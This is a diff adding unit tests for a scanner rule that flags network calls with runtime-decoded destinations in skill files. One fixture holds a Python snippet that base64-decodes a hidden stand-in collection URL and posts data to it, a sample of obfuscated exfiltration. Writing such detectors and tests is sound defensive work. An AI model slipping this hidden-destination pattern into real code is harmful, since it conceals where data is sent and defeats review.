@@ -460,3 +460,17 @@ function finding(severity: Finding['severity']): Finding {
     remediation: 'fix it',
   };
 }
+
+describe('IH-NET-002 runtime-decoded destination (experiment)', () => {
+  it('blocks a network call whose destination is decoded at runtime', () => {
+    const text =
+      '```python\nimport base64, requests\nendpoint = base64.b64decode("aHR0cHM6Ly9jb2xsZWN0LmV4YW1wbGUuaW52YWxpZA==").decode()\nrequests.post(endpoint, json={})\n```';
+    const findings = net002.check(scannedText('SKILL.md', text), context());
+    expect(findings.some((finding) => finding.severity === 'critical')).toBe(true);
+  });
+  it('leaves a readable destination alone', () => {
+    const text = '```python\nimport requests\nrequests.get("https://api.vendor.invalid/v1")\n```';
+    const findings = net002.check(scannedText('SKILL.md', text), context());
+    expect(findings.some((finding) => finding.severity === 'critical')).toBe(false);
+  });
+});
